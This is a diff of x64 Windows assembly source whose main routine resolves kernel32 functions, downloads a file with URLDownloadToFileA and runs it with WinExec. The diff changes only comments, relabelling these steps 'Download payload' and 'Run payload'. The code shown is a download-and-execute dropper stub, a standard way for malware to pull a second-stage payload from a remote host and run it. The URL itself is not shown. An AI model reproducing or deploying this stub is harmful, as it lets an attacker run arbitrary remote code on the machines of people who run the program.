@@ -134,7 +134,6 @@ WinMain:
         align_enter %$localsize
         
         
-        ; IMPORT
         ; LoadLibraryA
         lea         rcx, [szLoadLibraryA]
         call        GetKernel32ProcAddress
@@ -167,6 +166,7 @@ WinMain:
         mov         qword [pURLDownloadToFileA], rax
         
         
+        ; CODE
         mov         rcx, [pWinExec]
         mov         rdx, 16
         call        PrintNum
@@ -175,8 +175,7 @@ WinMain:
         mov         rdx, 16
         call        PrintNum
         
-        
-        ; pURLDownloadToFileA(NULL, url.c_str(), filename.c_str(), 0, NULL);
+        ; Download payload
         mov         rcx, 0
         lea         rdx, [szUrl]
         lea         r8, [szPayload]
@@ -184,7 +183,7 @@ WinMain:
         mov         qword [rsp+32], 0
         call        qword [pURLDownloadToFileA]
         
-        ; Call WinExec
+        ; Run payload
         lea         rcx, [szPayload]
         mov         rdx, 5
         call        qword [pWinExec]
